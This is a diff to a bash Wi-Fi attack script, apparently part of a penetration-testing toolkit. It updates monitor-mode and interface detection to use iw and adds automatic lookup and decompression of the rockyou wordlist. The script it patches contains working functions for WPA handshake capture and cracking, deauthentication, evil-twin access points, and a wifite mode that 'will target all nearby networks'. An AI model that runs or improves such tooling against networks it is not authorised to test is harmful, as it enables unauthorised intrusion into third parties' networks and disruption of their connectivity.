@@ -18,19 +18,58 @@ NC='\033[0m'
 SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
 PROJECT_ROOT="$(dirname "$(dirname "$SCRIPT_DIR")")"
 OUTPUT_DIR="$PROJECT_ROOT/output/captures"
-WORDLIST="/usr/share/wordlists/rockyou.txt"
 
-# Auto-detect Interface
+# Find a usable wordlist — auto-decompress rockyou if needed
+find_wordlist() {
+    local rockyou="/usr/share/wordlists/rockyou.txt"
+    local rockyou_gz="/usr/share/wordlists/rockyou.txt.gz"
+
+    if [[ -f "$rockyou" ]]; then
+        echo "$rockyou"
+        return 0
+    fi
+    if [[ -f "$rockyou_gz" ]]; then
+        log_warning "Decompressing rockyou.txt.gz..."
+        gunzip -k "$rockyou_gz" && echo "$rockyou" && return 0
+    fi
+    # Search for any common wordlist
+    local found
+    found=$(find /usr/share/wordlists -name "*.txt" 2>/dev/null | head -n 1)
+    if [[ -n "$found" ]]; then
+        log_warning "rockyou.txt not found, using fallback: $found"
+        echo "$found"
+        return 0
+    fi
+    log_error "No wordlist found. Install wordlists: sudo apt install wordlists"
+    return 1
+}
+
+WORDLIST=$(find_wordlist 2>/dev/null || echo "")
+
+# Auto-detect wireless interface using iw (handles wlan*, wlp*, wlx* naming)
 detect_interface() {
-    # Check for wlan1 (commonly external adapter)
-    if iwconfig 2>/dev/null | grep -q "^wlan1"; then
-        echo "wlan1"
-    # Check for wlan0 (internal)
-    elif iwconfig 2>/dev/null | grep -q "^wlan0"; then
-        echo "wlan0"
-    # Fallback: Find anything starting with wlan or wlp
+    # Prefer external adapters (not the first one, which is usually built-in)
+    # Use iw dev which works regardless of interface naming convention
+    local ifaces
+    ifaces=$(iw dev 2>/dev/null | awk '/Interface/{print $2}')
+
+    if [[ -z "$ifaces" ]]; then
+        # Fallback to ip link for any wireless
+        ifaces=$(ip link show 2>/dev/null | awk -F': ' '/^[0-9]+: wl/{print $2}')
+    fi
+
+    if [[ -z "$ifaces" ]]; then
+        echo ""
+        return 1
+    fi
+
+    # Prefer wlan1/external adapters (more likely to be the pentest adapter)
+    local preferred
+    preferred=$(echo "$ifaces" | grep -v '^wlan0$' | head -n 1)
+    if [[ -n "$preferred" ]]; then
+        echo "$preferred"
     else
-        iwconfig 2>&1 | grep "IEEE 802.11" | awk '{print $1}' | head -n 1
+        echo "$ifaces" | head -n 1
     fi
 }
 
@@ -80,49 +119,56 @@ kill_processes() {
     log_success "Processes killed"
 }
 
-# Enable monitor mode
+# Enable monitor mode and return the resulting monitor interface name
 enable_monitor_mode() {
     log_info "Enabling monitor mode on $INTERFACE..."
-    
+
     # Check if interface exists
-    if ! iwconfig 2>/dev/null | grep -q "$INTERFACE"; then
+    if ! iw dev 2>/dev/null | grep -q "$INTERFACE"; then
         log_error "Interface $INTERFACE not found!"
         log_info "Available interfaces:"
-        iwconfig 2>&1 | grep "IEEE 802.11" | awk '{print $1}'
+        iw dev 2>/dev/null | awk '/Interface/{print "  " $2}'
         exit 1
     fi
-    
+
     # Check if already in monitor mode
-    if iwconfig "$INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
+    if iw dev 2>/dev/null | awk "/Interface $INTERFACE/{f=1} f && /type/{print; f=0}" | grep -q monitor; then
         log_success "Interface $INTERFACE is already in monitor mode"
         MONITOR_INTERFACE="$INTERFACE"
         return
     fi
 
-    # Enable monitor mode
-    airmon-ng start "$INTERFACE" > /dev/null 2>&1
-    
-    # Update monitor interface name (sometimes it stays wlanX, sometimes wlanXmon)
-    # We check for the one that has Mode:Monitor
-    if iwconfig 2>/dev/null | grep -q "${INTERFACE}mon"; then
-        MONITOR_INTERFACE="${INTERFACE}mon"
-    elif iwconfig "$INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
-        MONITOR_INTERFACE="$INTERFACE"
+    # Kill interfering processes first
+    airmon-ng check kill > /dev/null 2>&1 || true
+
+    # Enable monitor mode via airmon-ng and parse resulting interface name
+    local airmon_out
+    airmon_out=$(airmon-ng start "$INTERFACE" 2>&1)
+    log_info "airmon-ng output: $airmon_out"
+
+    # Detect the resulting monitor interface from airmon-ng output
+    local mon_iface
+    mon_iface=$(echo "$airmon_out" | grep -oP '(?<=monitor mode vif enabled for|monitor mode enabled on|enabled on )\S+' | tail -1)
+
+    # Fallback: scan iw dev for any interface now in monitor mode
+    if [[ -z "$mon_iface" ]]; then
+        mon_iface=$(iw dev 2>/dev/null | awk 'BEGIN{iface=""} /Interface/{iface=$2} /type monitor/{print iface; exit}')
     fi
-    
-    if iwconfig "$MONITOR_INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
+
+    if [[ -n "$mon_iface" ]]; then
+        MONITOR_INTERFACE="$mon_iface"
         log_success "Monitor mode enabled on $MONITOR_INTERFACE"
     else
-        log_error "Failed to enable monitor mode"
-        # Try brute force method
-        log_info "Attempting alternative method..."
-        ifconfig "$INTERFACE" down
-        iwconfig "$INTERFACE" mode monitor
-        ifconfig "$INTERFACE" up
-        if iwconfig "$INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
-            MONITOR_INTERFACE="$INTERFACE"
-            log_success "Monitor mode enabled on $MONITOR_INTERFACE (Manual method)"
+        # Brute-force fallback
+        log_info "Attempting fallback method..."
+        ip link set "$INTERFACE" down
+        iw "$INTERFACE" set monitor none
+        ip link set "$INTERFACE" up
+        MONITOR_INTERFACE="$INTERFACE"
+        if iw dev 2>/dev/null | awk "/Interface $INTERFACE/{f=1} f && /type/{print; f=0}" | grep -q monitor; then
+            log_success "Monitor mode enabled via fallback on $MONITOR_INTERFACE"
         else
+            log_error "Failed to enable monitor mode on $INTERFACE"
             exit 1
         fi
     fi
@@ -166,7 +212,7 @@ capture_handshake() {
     local output_file="$OUTPUT_DIR/handshake_$(date +%Y%m%d_%H%M%S)"
     
     log_info "Switching $MONITOR_INTERFACE to channel $channel..."
-    iwconfig "$MONITOR_INTERFACE" channel "$channel"
+    iw dev "$MONITOR_INTERFACE" set channel "$channel" 2>/dev/null || iwconfig "$MONITOR_INTERFACE" channel "$channel" 2>/dev/null || true
     sleep 1
 
     log_info "Capturing handshake for $bssid on channel $channel"
@@ -198,16 +244,21 @@ auto_attack() {
     log_warning "This will target all nearby networks"
     echo ""
 
-    if ! iwconfig "$MONITOR_INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
+    if ! iw dev 2>/dev/null | awk "/Interface $MONITOR_INTERFACE/{f=1} f && /type/{print; f=0}" | grep -q monitor; then
         log_error "Interface $MONITOR_INTERFACE is not in monitor mode. Run --monitor-on first."
         exit 1
     fi
 
-    wifite --kill \
-           --dict "$WORDLIST" \
-           --wpa \
-           --no-wps \
-           -i "$MONITOR_INTERFACE"
+    if [[ -z "$WORDLIST" ]]; then
+        log_warning "No wordlist available. Running wifite without dictionary..."
+        wifite --kill --wpa --no-wps -i "$MONITOR_INTERFACE"
+    else
+        wifite --kill \
+               --dict "$WORDLIST" \
+               --wpa \
+               --no-wps \
+               -i "$MONITOR_INTERFACE"
+    fi
 }
 
 # Deauth attack
@@ -225,7 +276,7 @@ deauth_attack() {
     
     if [[ -n "$channel" ]]; then
         log_info "Switching $MONITOR_INTERFACE to channel $channel..."
-        iwconfig "$MONITOR_INTERFACE" channel "$channel"
+        iw dev "$MONITOR_INTERFACE" set channel "$channel" 2>/dev/null || iwconfig "$MONITOR_INTERFACE" channel "$channel" 2>/dev/null || true
         sleep 1
     fi
     
@@ -273,7 +324,7 @@ evil_twin() {
     enable_monitor_mode
 
     log_info "Switching $MONITOR_INTERFACE to channel $channel..."
-    iwconfig "$MONITOR_INTERFACE" channel "$channel"
+    iw dev "$MONITOR_INTERFACE" set channel "$channel" 2>/dev/null || iwconfig "$MONITOR_INTERFACE" channel "$channel" 2>/dev/null || true
     sleep 1
     
     log_info "Broadcasting SSID: $ssid on channel $channel"
@@ -298,6 +349,14 @@ crack_handshake() {
     if [[ ! -f "$cap_file" ]]; then
         log_error "File not found: $cap_file"
         exit 1
+    fi
+
+    if [[ -z "$wordlist" ]]; then
+        wordlist=$(find_wordlist)
+        if [[ $? -ne 0 ]]; then
+            log_error "No wordlist available. Provide one with: $0 --crack <CAP_FILE> <WORDLIST>"
+            exit 1
+        fi
     fi
     
     log_info "Cracking handshake: $cap_file"
